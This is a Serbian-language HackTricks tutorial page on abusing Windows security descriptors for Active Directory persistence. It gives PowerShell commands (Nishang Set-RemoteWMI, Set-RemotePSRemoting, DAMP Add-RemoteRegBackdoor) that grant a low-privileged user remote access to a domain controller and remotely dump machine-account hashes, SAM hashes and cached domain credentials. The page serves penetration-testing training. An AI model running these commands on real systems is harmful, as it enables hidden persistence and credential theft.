# Bezbednosni deskriptori

{{#include ../../banners/hacktricks-training.md}}

## Bezbednosni deskriptori

Windows bezbednosni deskriptori sadrže SID vlasnika, SID primarne grupe, diskrecionu ACL (DACL) koja kontroliše pristup i sistemsku ACL (SACL) koja se uglavnom koristi za auditing. Security Descriptor Definition Language (SDDL) predstavlja tekstualni prikaz; ACE string ima oblik `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Bezbednosni deskriptor čuva podatke o tome ko poseduje securable objekat i kojim principalima je dozvoljen ili zabranjen određeni skup prava nad njim. Ako attacker može da promeni DACL, može dodeliti low-privileged principalu prava koja obično zahtevaju administratorsku ulogu.

Zbog toga su usko izmenjeni deskriptori korisni za persistence: nalog ostaje izvan očiglednih privileged grupa, a ipak zadržava pristup određenoj management površini. Sačuvajte originalni deskriptor pre testiranja kako bi promena mogla biti uklonjena u potpunosti.

### Pristup WMI-ju

Korisniku možete dati pristup za **daljinsko izvršavanje WMI-ja** [**pomoću ovoga**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Pristup WinRM-u

Dodelite korisniku pristup udaljenoj PowerShell/WinRM krajnjoj tački pomoću Nishang funkcije `Set-RemotePSRemoting`:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access to hashes

DAMP može da kreira registry-ACL backdoor koji kasnije omogućava udaljeno preuzimanje machine-account hash-a, lokalnih SAM hash-eva i keširanih domain credentials. Dodeljivanje ovih usko ograničenih prava inače običnom nalogu — naročito nad domain controller-om — pruža moćnu persistence bez članstva u privileged grupi.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Pogledajte [**Silver Tickets**](silver-ticket.md) da biste saznali kako možete koristiti hash naloga računara Domain Controller-a.

## References

- [1] [Jezik definicije bezbednosnih deskriptora - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Projekat izmene diskrecionih ACL-ova](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Format stringe bezbednosnog deskriptora](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
